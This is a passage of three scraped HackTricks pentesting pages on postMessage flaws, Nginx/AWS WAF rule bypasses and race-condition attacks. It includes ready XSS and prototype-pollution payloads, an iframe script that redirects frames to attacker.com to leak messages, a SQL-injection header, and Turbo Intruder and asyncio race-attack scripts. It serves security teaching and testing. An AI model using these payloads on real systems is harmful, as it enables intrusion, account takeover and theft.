        "text": "PostMessage Vulnerabilities\nPostMessage Vulnerabilities\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nSend\nPostMessage\nPostMessage\nuses the following function to send a message:\ntargetWindow.postMessage\n(\nmessage, targetOrigin,\n[\ntransfer\n]);\n‚Äã\n# postMessage to current page\nwindow.postMessage\n(\n'{\"__proto__\":{\"isAdmin\":True}}'\n,\n'*'\n)\n‚Äã\n# postMessage to an iframe with id \"idframe\"\n<\niframe\nid\n=\n\"idframe\"\nsrc\n=\n\"http://victim.com/\"\n><\n/iframe\n>\ndocument.getElementById\n(\n'idframe'\n)\n.contentWindow.postMessage\n(\n'{\"__proto__\":{\"isAdmin\":True}}'\n,\n'*'\n)\n‚Äã\n# postMessage to an iframe via onload\n<\niframe\nsrc\n=\n\"https://victim.com/\"\nonload\n=\n\"this.contentWindow.postMessage('<script>print()</script>','*')\"\n>\n‚Äã\n# postMessage to popup\nwin\n=\nopen\n(\n'URL'\n,\n'hack'\n,\n'width=800,height=300,top=500'\n);\nwin.postMessage\n(\n'{\"__proto__\":{\"isAdmin\":True}}'\n,\n'*'\n)\n‚Äã\n# postMessage to an URL\nwindow.postMessage\n(\n'{\"__proto__\":{\"isAdmin\":True}}'\n,\n'https://company.com'\n)\n‚Äã\n# postMessage to iframe inside popup\nwin\n=\nopen\n(\n'URL-with-iframe-inside'\n,\n'hack'\n,\n'width=800,height=300,top=500'\n);\n## loop until win.length == 1 (until the iframe is loaded)\nwin\n[\n0\n]\n.postMessage\n(\n'{\"__proto__\":{\"isAdmin\":True}}'\n,\n'*'\n)\nNote that\ntargetOrigin\ncan be a '*' or an URL like\nhttps://company.com.\nIn the\nsecond scenario\n, the\nmessage can only be sent to that domain\n(even if the origin of the window object is different).\nIf the\nwildcard\nis used,\nmessages could be sent to any domain\n, and will be sent to the origin of the Window object.\nAttacking iframe & wildcard in\ntargetOrigin\nAs explained in\nthis report\nif you find a page that can be\niframed\n(no\nX-Frame-Header\nprotection) and that is\nsending sensitive\nmessage via\npostMessage\nusing a\nwildcard\n(*), you can\nmodify\nthe\norigin\nof the\niframe\nand\nleak\nthe\nsensitive\nmessage to a domain controlled by you.\nNote that if the page can be iframed but the\ntargetOrigin\nis\nset to a URL and not to a wildcard\n, this\ntrick won't work\n.\n<\nhtml\n>\n<\niframe\nsrc\n=\n\"\nhttps://docs.google.com/document/ID\n\"\n/>\n<\nscript\n>\nsetTimeout\n(\nexp\n,\n6000\n);\n//Wait 6s\n//Try to change the origin of the iframe each 100ms\nfunction\nexp\n(){\nsetInterval\n(\nfunction\n(){\nwindow\n.\nframes\n[\n0\n].\nframe\n[\n0\n][\n2\n].\nlocation\n=\n\"https://attacker.com/exploit.html\"\n;\n},\n100\n);\n}\n</\nscript\n>\naddEventListener exploitation\naddEventListener\nis the function used by JS to declare the function that is\nexpecting\npostMessages\n.\nA code similar to the following one will be used:\nwindow\n.\naddEventListener\n(\n\"message\"\n,\n(\nevent\n)\n=>\n{\nif\n(\nevent\n.\norigin\n!==\n\"http://example.org:8080\"\n)\nreturn\n;\n‚Äã\n// ...\n},\nfalse\n);\nNote in this case how the\nfirst thing\nthat the code is doing is\nchecking the origin\n. This is terribly\nimportant\nmainly if the page is going to do\nanything sensitive\nwith the received information (like changing a password).\nIf it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints\nand change the victims passwords (in this example).\nEnumeration\nIn order to\nfind event listeners\nin the current page you can:\nSearch\nthe JS code for\nwindow.addEventListener\nand\n$(window).on\n(\nJQuery version\n)\nExecute\nin the developer tools console:\ngetEventListeners(window)\nGo to\nElements --> Event Listeners\nin the developer tools of the browser\nUse a\nbrowser extension\nlike\nhttps://github.com/benso-io/posta\nor\nhttps://github.com/fransr/postMessage-tracker\n. This browser extensions will\nintercept all the messages\nand show them to you.\ncheck origin basic bypasses\nIf\nindexOf()\nis used to\ncheck\nthe\norigin\nof the PostMessage event, remember that it can be easily bypassed like in the following example:\n(\"https://app-sj17.marketo.com\").indexOf(\"https://app-sj17.ma\")\n\\\nIf\nsearch()\nis used to\nvalidate\nthe\norigin\ncould be insecure. According to the docs of\nString.prototype.search()\n, the method\ntakes a regular repression\nobject instead of a string. If anything other than regexp is passed, it will get implicitly converted into a regexp.\nIn regular expression,\na dot (.) is treated as a wildcard\n. An attacker can take advantage of it and\nuse\na\nspecial domain\ninstead of the official one to bypass the validation, like in:\n\"https://www.safedomain.com\".search(\"www.s.fedomain.com\")\n.\\\nIf\nescapeHtml\nfunction is used, the function does not create a\nnew\nescaped object, instead it\noverwrites properties\nof the existing object. This means that if we are able to create an object with a controlled property that does not respond to\nhasOwnProperty\nit will not be escaped.\n// Expected to fail:\nresult\n=\nu\n({\nmessage\n:\n\"'\\\"<b>\\\\\"\n});\nresult\n.\nmessage\n// \"&#39;&quot;&lt;b&gt;\\\"\n// Bypassed:\nresult\n=\nu\n(\nnew\nError\n(\n\"'\\\"<b>\\\\\"\n));\nresult\n.\nmessage\n;\n// \"'\"<b>\\\"\nFile\nobject is perfect for this exploit as it has a read-only\nname\nproperty which is used by our template and will bypass\nescapeHtml\nfunction.\nBypassing e.origin == window.origin\nWhen a page is embedded in a\nsandboxed iframe\nvia\n<iframe sandbox=\"allow-scripts\" src=\"https://so-xss.terjanq.me/iframe.php\">\nthe\norigin\nof that\niframe\nwill be\nnull\n.\nWhen the\nsandbox value\nallow-popups\nis set\nthen the\nopened popup\nwill\ninherit\nall the\nsandboxed attributes\nunless\nallow-popups-to-escape-sandbox\nis set.\nSo, opening a\npopup\nfrom a\nnull origin\nwill make\nwindow.origin\ninside the popup also\nnull\n.\nTherefore, if you open a\nsandboxed iframe\nallowing popups, and then you\nopens a popup\nfrom inside the iframe, and\nsend a postMessage\nfrom the iframe\nto the popup\n, both origins are null so:\ne.origin == window.origin == null\nFor more information\nread\n:\nBypassing SOP with Iframes - 1\nBypassing e.source\nYou can force\ne.source\nof a message to be null by creating an\niframe\nthat\nsends\nthe\npostMessage\nand is\nimmediately deleted\n.\nFor more information\nread:\nBypassing SOP with Iframes - 2\nX-Frame-Header bypass\nIn order to perform these attacks ideally you will be able to\nput the victim web page\ninside an\niframe\n. But some headers like\nX-Frame-Header\ncan\nprevent\nthat\nbehaviour\n.\nIn those scenarios you can still use a less stealthy attack. You can open a new tab to the vulnerable web application and communicate with it:\n<\nscript\n>\nvar\nw\n=\nwindow\n.\nopen\n(\n\"<url>\"\n)\nsetTimeout\n(\nfunction\n(){\nw\n.\npostMessage\n(\n'text here'\n,\n'*'\n);},\n2000\n);\n</\nscript\n>\nStealing message sent to child by blocking the main page\nIn the following page you can see how you could steal a\nsensitive postmessage data\nsent to a\nchild iframe\nby\nblocking\nthe\nmain\npage before sending the data and abusing a\nXSS in the child\nto\nleak the data\nbefore it's received:\nBlocking main page to steal postmessage\nStealing message by modifying iframe location\nif you can iframe a webpage without X-Frame-Header that contains another iframe, you can\nchange the location of that child iframe\n, so if it's receiving a\npostmessage\nsent using a\nwildcard\n, an attacker could\nchange\nthat iframe\norigin\nto a page\ncontrolled\nby him and\nsteal\nthe message:\nSteal postmessage modifying iframe location\npostMessage to Prototype Pollution and/or XSS\nIn scenarios where the data sent through\npostMessage\nis executed by JS, you can\niframe\nthe\npage\nand\nexploit\nthe\nprototype pollution/XSS\nsending the exploit via\npostMessage\n.\nA couple of\nvery good explained XSS though\npostMessage\ncan be found in\nhttps://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html\n‚Äã\nExample of an exploit to abuse\nPrototype Pollution and then XSS\nthrough a\npostMessage\nto an\niframe\n:\n<\nhtml\n>\n<\nbody\n>\n<\niframe\nid\n=\n\"\nidframe\n\"\nsrc\n=\n\"\nhttp://127.0.0.1:21501/snippets/demo-3/embed\n\"\n>\n</\niframe\n>\n<\nscript\n>\nfunction\nget_code\n()\n{\ndocument\n.\ngetElementById\n(\n'iframe_victim'\n).\ncontentWindow\n.\npostMessage\n(\n'{\"__proto__\":{\"editedbymod\":{\"username\":\"<img src=x onerror=\\\\\\\"fetch(\\'http://127.0.0.1:21501/api/invitecodes\\', {credentials: \\'same-origin\\'}).then(response => response.json()).then(data => {alert(data[\\'result\\'][0][\\'code\\']);})\\\\\\\" />\"}}}'\n,\n'*'\n);\ndocument\n.\ngetElementById\n(\n'iframe_victim'\n).\ncontentWindow\n.\npostMessage\n(\nJSON\n.\nstringify\n(\n\"refresh\"\n),\n'*'\n);\n}\n‚Äã\nsetTimeout\n(\nget_code\n,\n2000\n);\n</\nscript\n>\n</\nbody\n>\n</\nhtml\n>\nFor\nmore information\n:\nLink to page about\nprototype pollution\n‚Äã\nLink to page about\nXSS\n‚Äã\nLink to page about\nclient side prototype pollution to XSS\n‚Äã\nReferences\n‚Äã\nhttps://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html\n‚Äã\n‚Äã\nhttps://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd\n‚Äã\nTo practice:\nhttps://github.com/yavolo/eventlistener-xss-recon\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nPhone Number Injections\nNext\nBlocking main page to steal postmessage\nLast modified\n6mo ago"
    },
    {
        "title": "Proxy / WAF Protections Bypass",
        "url": "https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass",
        "text": "Proxy / WAF Protections Bypass\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBypassing Nginx ACL Rules\nNginx restriction example:\nlocation = /admin {\ndeny all;\n}\n‚Äã\nlocation = /admin/ {\ndeny all;\n}\nNodeJS\nAs Nginx includes the character\n\\xa0\nas part of the pathname, the ACL rule for the\n/admin\nURI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;\nWhen the URI\n/admin\\x0a\nis received by the Node.js server, the character\n\\xa0\nwill be removed, allowing successful retrieval of the\n/admin\nendpoint.\nNginx Version\nNode.js Bypass Characters\n1.22.0\n\\xA0\n1.21.6\n\\xA0\n1.20.2\n\\xA0\n,\n\\x09\n,\n\\x0C\n1.18.0\n\\xA0\n,\n\\x09\n,\n\\x0C\n1.16.1\n\\xA0\n,\n\\x09\n,\n\\x0C\nFlask\nFlask removes the characters\n\\x85\n,\n\\xA0\n,\n\\x1F\n,\n\\x1E\n,\n\\x1D\n,\n\\x1C\n,\n\\x0C\n,\n\\x0B\n, and\n\\x09\nfrom the URL path, but NGINX doesn't.\nNginx Version\nFlask Bypass Characters\n1.22.0\n\\x85\n,\n\\xA0\n1.21.6\n\\x85\n,\n\\xA0\n1.20.2\n\\x85\n,\n\\xA0\n,\n\\x1F\n,\n\\x1E\n,\n\\x1D\n,\n\\x1C\n,\n\\x0C\n,\n\\x0B\n1.18.0\n\\x85\n,\n\\xA0\n,\n\\x1F\n,\n\\x1E\n,\n\\x1D\n,\n\\x1C\n,\n\\x0C\n,\n\\x0B\n1.16.1\n\\x85\n,\n\\xA0\n,\n\\x1F\n,\n\\x1E\n,\n\\x1D\n,\n\\x1C\n,\n\\x0C\n,\n\\x0B\nSpring Boot\nBelow, you will find a demonstration of how ACL protection can be circumvented by adding the character\n\\x09\nor  at the end of the pathname:\nNginx Version\nSpring Boot Bypass Characters\n1.22.0\n;\n1.21.6\n;\n1.20.2\n\\x09\n,\n;\n1.18.0\n\\x09\n,\n;\n1.16.1\n\\x09\n,\n;\nPHP-FPM\nLet's consider the following Nginx FPM configuration:\nlocation = /admin.php {\ndeny all;\n}\n‚Äã\nlocation ~ \\.php$ {\ninclude snippets/fastcgi-php.conf;\nfastcgi_pass unix:/run/php/php8.1-fpm.sock;\n}\nIt's possible to bypass it accessing\n/admin.php/index.php\n:\nHow to prevent\nTo prevent these issues, you must use the\n~\nexpression Instead of the\n=\nexpression on Nginx ACL rules, for example:\nCOPYCOPY\nlocation ~* ^/admin {\ndeny all;\n}\nBypassing AWS WAF ACL With Line Folding\nIt's possible to bypass AWS WAF protection in a HTTP header by using the following syntax where the AWS WAF won't understand X-Query header contains a sql injection payload while the node server behind will:\nGET\n/\nHTTP/1.1\n\\r\\n\nHost\n:\ntarget.com\\r\\n\nX-Query\n:\nValue\\r\\n\n\\t' or '1'='1' -- \\r\\n\nConnection\n:\nclose\\r\\n\n\\r\\n\nReferences\n‚Äã\nhttps://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nSteal postmessage modifying iframe location\nNext\n- Pentesting Web\nRace Condition\nLast modified\n30d ago"
    },
    {
        "title": "Race Condition",
        "url": "https://book.hacktricks.xyz/pentesting-web/race-condition",
        "text": "Race Condition\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nExploiting RC\nThe main problem of abusing RC's is that you need the requests to be processed in parallel with a very short time difference(usually >1ms). In the following section, different solutions are proposed for making this possible.\nSingle-packet attack (HTTP/2) / Last-byte sync (HTTP/1.1)\nHTTP2 allows to send\n2 requests in a single TCP connetion\n(whereas in HTTP/1.1 they have to be sequential).\nThe use of a single TCP packet completely\neliminates the effect of network jitter\n, so this clearly has potential for race condition attacks too. However,\ntwo requests isn't enough for a reliable race attack\nthanks to\nserver-side jitter\n- variations in the application's request-processing time caused by uncontrollable variables like CPU contention.\nBut, using HTTP/1.1 '\nlast-byte sync\n' technique it's possible to pre-send the bulk of the data withholding a tiny fragment from each request and then 'complete'\n20-30 requests with a single TCP packet\n.\nTo\npre-send the bulk of each request\n:\nIf the request has no body, send all the headers, but don't set the END_STREAM flag. Withhold an empty data frame with END_STREAM set.\nIf the request has a body, send the headers and all the body data except the final byte. Withhold a data frame containing the final byte.\nNext,\nprepare to send the final frames\n:\nWait for 100ms to ensure the initial frames have been sent.\nEnsure TCP_NODELAY is disabled - it's crucial that Nagle's algorithm batches the final frames.\nSend a ping packet to warm the local connection. If you don't do this, the OS network stack will place the first final-frame in a separate packet.\nFinally, send the withheld frames. You should be able to verify that they landed in a single packet using Wireshark.\nNote that It\ndoesn't work for static files\non certain servers but as static files aren't relevant to race condition attacks. But static files are irrelevant for RC attacks.\nUsing this technique, you can make 20-30 requests arrive at the server simultaneously - regardless of network jitter:\nAdapting to the target architecture\nIt's worth noting that many applications sit behind a front-end server, and these may decide to forward some requests over existing connections to the back-end, and to create fresh connections for others.\nAs a result, it's important not to attribute inconsistent request timing to application behaviour such as locking mechanisms that only allow a single thread to access a resource at once. Also, front-end request routing is often done on a per-connection basis, so you may be able to smooth request timing by performing server-side connection warming -\nsending a few inconsequential requests down your connection before performing the attack\n(this is just sending several request before starting the actual attack)).\nSession-based locking mechanisms\nSome frameworks attempt to prevent accidental data corruption by using some form of\nrequest locking\n. For example,\nPHP's native session handler\nmodule only processes\none request per session at a time\n.\nIt's extremely important to spot this kind of behaviour as it can otherwise mask trivially exploitable vulnerabilities. If you notice that all of your requests are being processed sequentially, try sending each of them using a different session token.\nAbusing rate or resource limits\nIf connection warming doesn't make any difference, there are various solutions to this problem.\nUsing Turbo Intruder, you can introduce a short client-side delay. However, as this involves splitting your actual attack requests across multiple TCP packets, you won't be able to use the single-packet attack technique. As a result, on high-jitter targets, the attack is unlikely to work reliably regardless of what delay you set.\nInstead, you may be able to solve this problem by abusing a common security feature.\nWeb servers often\ndelay the processing of requests if too many are sent too quickly\n. By sending a large number of dummy requests to intentionally trigger the rate or resource limit, you may be able to cause a suitable server-side delay. This makes the single-packet attack viable even when delayed execution is required.\nFor more information about this technique check the original report in\nhttps://portswigger.net/research/smashing-the-state-machine\n‚Äã\nAttack Examples\nTubo Intruder - HTTP2 single-packet attack (1 endpoint)\n: You can send the request to\nTurbo intruder\n(\nExtensions\n->\nTurbo Intruder\n->\nSend to Turbo Intruder\n), you can change in the request the value you want to brute force for\n%s\nlike in\ncsrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s\nand then select the\nexamples/race-single-packer-attack.py\nfrom the drop down:\nIf you are going to\nsend different values\n, you could modify the code with this one that uses a wordlist from the clipboard:\npasswords\n=\nwordlists\n.\nclipboard\nfor\npassword\nin\npasswords\n:\nengine\n.\nqueue\n(\ntarget\n.\nreq\n,\npassword\n,\ngate\n=\n'race1'\n)\nIf the web doesn't support HTTP2 (only HTTP1.1) use\nEngine.THREADED\nor\nEngine.BURP\ninstead of\nEngine.BURP2\n.\nTubo Intruder - HTTP2 single-packet attack (Several endpoints)\n: In case you need to send a request to 1 endpoint and then multiple to other endpoints to trigger the RCE, you can change the\nrace-single-packet-attack.py\nscript with something like:\ndef\nqueueRequests\n(\ntarget\n,\nwordlists\n):\nengine\n=\nRequestEngine\n(\nendpoint\n=\ntarget\n.\nendpoint\n,\nconcurrentConnections\n=\n1\n,\nengine\n=\nEngine\n.\nBURP2\n)\n# Hardcode the second request for the RC\nconfirmationReq\n=\n'''POST /confirm?token[]= HTTP/2\nHost: 0a9c00370490e77e837419c4005900d0.web-security-academy.net\nCookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU\nContent-Length: 0\n‚Äã\n'''\n# For each attempt (20 in total) send 50 confirmation requests.\nfor\nattempt\nin\nrange\n(\n20\n):\ncurrentAttempt\n=\nstr\n(\nattempt\n)\nusername\n=\n'aUser'\n+\ncurrentAttempt\n# queue a single registration request\nengine\n.\nqueue\n(\ntarget\n.\nreq\n,\nusername\n,\ngate\n=\ncurrentAttempt\n)\n# queue 50 confirmation requests - note that this will probably sent in two separate packets\nfor\ni\nin\nrange\n(\n50\n):\nengine\n.\nqueue\n(\nconfirmationReq\n,\ngate\n=\ncurrentAttempt\n)\n# send all the queued requests for this attempt\nengine\n.\nopenGate\n(\ncurrentAttempt\n)\nIt's also available in\nRepeater\nvia the new '\nSend group in parallel\n' option in Burp Suite.\nFor\nlimit-overrun\nyou could just add the\nsame request 50 times\nin the group.\nFor\nconnection warming\n, you could\nadd\nat the\nbeginning\nof the\ngroup\nsome\nrequests\nto some non static part of the web server.\nFor\ndelaying\nthe process\nbetween\nprocessing\none request and another\nin a 2 substates steps, you could\nadd extra requests between\nboth requests.\nFor a\nmulti-endpoint\nRC you could start sending the\nrequest\nthat\ngoes to the hidden state\nand then\n50 requests\njust after it that\nexploits the hidden state\n.\nRaw BF\nBefore the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.\nRepeater:\nCheck the examples from the previous section.\nIntruder\n: Send the\nrequest\nto\nIntruder\n, set the\nnumber of threads\nto\n30\ninside the\nOptions menu and,\nselect as payload\nNull payloads\nand generate\n30.\nTurbo Intruder\ndef\nqueueRequests\n(\ntarget\n,\nwordlists\n):\nengine\n=\nRequestEngine\n(\nendpoint\n=\ntarget\n.\nendpoint\n,\nconcurrentConnections\n=\n5\n,\nrequestsPerConnection\n=\n1\n,\npipeline\n=\nFalse\n)\na\n=\n[\n'Session=<session_id_1>'\n,\n'Session=<session_id_2>'\n,\n'Session=<session_id_3>'\n]\nfor\ni\nin\nrange\n(\nlen\n(\na\n)):\nengine\n.\nqueue\n(\ntarget\n.\nreq\n,\na\n[\ni\n],\ngate\n=\n'race1'\n)\n# open TCP connections and send partial requests\nengine\n.\nstart\n(\ntimeout\n=\n10\n)\nengine\n.\nopenGate\n(\n'race1'\n)\nengine\n.\ncomplete\n(\ntimeout\n=\n60\n)\n‚Äã\ndef\nhandleResponse\n(\nreq\n,\ninteresting\n):\ntable\n.\nadd\n(\nreq\n)\nPython - asyncio\nimport\nasyncio\nimport\nhttpx\n‚Äã\nasync\ndef\nuse_code\n(\nclient\n):\nresp\n=\nawait\nclient\n.\npost\n(\nf'http://victim.com'\n,\ncookies\n=\n{\n\"session\"\n:\n\"asdasdasd\"\n},\ndata\n=\n{\n\"code\"\n:\n\"123123123\"\n})\nreturn\nresp\n.\ntext\n‚Äã\nasync\ndef\nmain\n():\nasync\nwith\nhttpx\n.\nAsyncClient\n()\nas\nclient\n:\ntasks\n=\n[]\nfor\n_\nin\nrange\n(\n20\n):\n#20 times\ntasks\n.\nappend\n(\nasyncio\n.\nensure_future\n(\nuse_code\n(\nclient\n)))\n# Get responses\nresults\n=\nawait\nasyncio\n.\ngather\n(\n*\ntasks\n,\nreturn_exceptions\n=\nTrue\n)\n# Print results\nfor\nr\nin\nresults\n:\nprint\n(\nr\n)\n# Async2sync sleep\nawait\nasyncio\n.\nsleep\n(\n0.5\n)\nprint\n(\nresults\n)\n‚Äã\nasyncio\n.\nrun\n(\nmain\n())\nRC Methodology\nLimit-overrun / TOCTOU\nThis is the most basic type of race condition where\nvulnerabilities\nthat\nappear\nin places that\nlimit the number of times you can perform an action\n. Like using the same discount code in a web store several times. A very easy example can be found in\nthis report\nor in\nthis bug\n.\nThere are many variations of this kind of attack, including:\nRedeeming a gift card multiple times\nRating a product multiple times\nWithdrawing or transferring cash in excess of your account balance\nReusing a single CAPTCHA solution\nBypassing an anti-brute-force rate limit\nHidden substates\nOther most complicated RC will exploit\nsubstates in the machine state\nthat could allow an attacker to\nabuse\nstates he was\nnever meant to have access\nto but there is a\nsmall window\nfor the attacker to access it.\n1.\nPredict potential hidden & interesting substates\nThe first step is to identify all the endpoints that either write to it, or read data from it and then use that data for something important. For example, users might be stored in a database table that is modified by registration, profile-edits, password reset initiation, and password reset completion.\nWe can use three key questions to rule out endpoints that are unlikely to cause collisions. For each object and the associated endpoints, ask:\nHow is the state stored?\nData that's stored in a persistent server-side data structure is ideal for exploitation. Some endpoints store their state entirely client-side, such as password resets that work by emailing a JWT - these can be safely skipped.\nApplications will often store some state in the user session. These are often somewhat protected against sub-states - more on that later.\nAre we editing or appending?\nOperations that edit existing data (such as changing an account's primary email address) have ample collision potential, whereas actions that simply append to existing data (such as adding an additional email address) are unlikely to be vulnerable to anything other than limit-overrun attacks.\nWhat's the operation keyed on?\nMost endpoints operate on a specific record, which is looked up using a 'key', such as a username, password reset token, or filename. For a successful attack, we need two operations that use the same key. For example, picture two plausible password reset implementations:\n2.\nProbe for clues\nAt this point it's time to\nlaunch some RCs attacks\nover the potential interesting endpoints to try to find unexpected results compare to the regular ones.\nAny deviation from the expected response\nsuch as a change in one or more responses, or a second-order effect like different email contents or a visible change in your session could be a clue indicating something is wrong.\n3.\nProve the concept\nThe final step is to\nprove the concept and turn it into a viable attack\n.\nWhen you send a batch of requests, you may find that an early request pair triggers a vulnerable end-state, but later requests overwrite/invalidate it and the final state is unexploitable. In this scenario, you'll want to eliminate all unnecessary requests - two should be sufficient for exploiting most vulnerabilities. However, dropping to two requests will make the attack more timing-sensitive, so you may need to retry the attack multiple times or automate it.\nTime Sensitive Attacks\nSometimes you may not find race conditions, but the\ntechniques for delivering requests with precise timing\ncan still reveal the presence of other vulnerabilities.\nOne such example is when\nhigh-resolution timestamps are used instead of cryptographically\nsecure random strings to generate security tokens.\nConsider a\npassword reset token that is only randomized using a timestamp\n. In this case, it might be possible to\ntrigger two password resets for two different users\n, which both use the\nsame token\n. All you need to do is time the requests so that they generate the same timestamp.\nTo confirm for example the previous situation you could just ask for\n2 reset password tokens at the same time\n(using single packet attack) and check if they are the\nsame\n.\nCheck the\nexample in this lab\n.\nHidden substates case studies\nPay & add an Item\n‚Äã\nCheck this lab\nto see how to\npay\nin a store and\nadd an extra\nitem you that\nwon't need to pay for it\n.\nConfirm other emails\nThe idea is to\nverify an email address and change it to a different one at the same time\nto find out if the platform verifies the new one changed.\nChange email to 2 emails addresses Cookie based\nAccording to\nthis writeup\nGitlab was vulnerable to a takeover this way because it might\nsend\nthe\nemail verification token of one email to the other email\n.\nYou can also check\nthis lab\nto learn about this.\nHidden Database states / Confirmation Bypass\nIf\n2 different write\ns are used to\nadd\ninformation\ninside a\ndatabase\n, there is a small portion of time where\nonly the first data has been written\ninside the database. For example, when creating a user the\nusername\nand\npassword\nmight be\nwritten\nand\nthen the token\nto confirm the newly created account is written. This means that for a small time the\ntoken to confirm an account is null\n.\nTherefore\nregistering an account and sending several requests with an empty token\n(\ntoken=\nor\ntoken[]=\nor any other variation) to confirm the account right away could allow to c\nonfirm an account\nwhere you don't control the email.\nCheck\nthis lab\nto check an example.\nBypass 2FA\nThe following pseudo-code demonstrates how a website could be vulnerable to a race variation of this attack:\nsession\n[\n'userid'\n]\n=\nuser\n.\nuserid\nif\nuser\n.\nmfa_enabled\n:\nsession\n[\n'enforce_mfa'\n]\n=\nTrue\n# generate and send MFA code to user\n# redirect browser to MFA code entry form\nAs you can see, this is in fact a\nmulti-step sequence within the span of a single request\n. Most importantly, it transitions through a sub-state in which the\nuser temporarily has a valid logged-in\nsession,\nbut MFA isn't yet being enforced\n. An attacker could potentially exploit this by sending a login request along with a request to a sensitive, authenticated endpoint.\nOAuth2 eternal persistence\nThere are several\nOAUth providers\n. Theses services will allow you to create an application and authenticate users that the provider has registered. In order to do so, the\nclient\nwill need to\npermit your application\nto access some of their data inside of the\nOAUth provider\n.\nSo, until here just a common login with google/linkdin/github... where you are prompted with a page saying: \"\nApplication <InsertCoolName> wants to access you information, do you want to allow it?\n\"\nRace Condition in\nauthorization_code\nThe\nproblem\nappears when you\naccept it\nand automatically sends an\nauthorization_code\nto the malicious application. Then, this\napplication abuses a Race Condition in the OAUth service provider to generate more that one AT/RT\n(\nAuthentication Token/Refresh Token\n) from the\nauthorization_code\nfor your account. Basically, it will abuse the fact that you have accept the application to access your data to\ncreate several accounts\n. Then, if you\nstop allowing the application to access your data one pair of AT/RT will be deleted, but the other ones will still be valid\n.\nRace Condition in\nRefresh Token\nOnce you have\nobtained a valid RT\nyou could try to\nabuse it to generate several AT/RT\nand\neven if the user cancels the permissions\nfor the malicious application to access his data,\nseveral RTs will still be valid.\nRC in WebSockets\nIn\nWS_RaceCondition_PoC\nyou can find a PoC in Java to send websocket messages in\nparallel\nto abuse\nRace Conditions also in Web 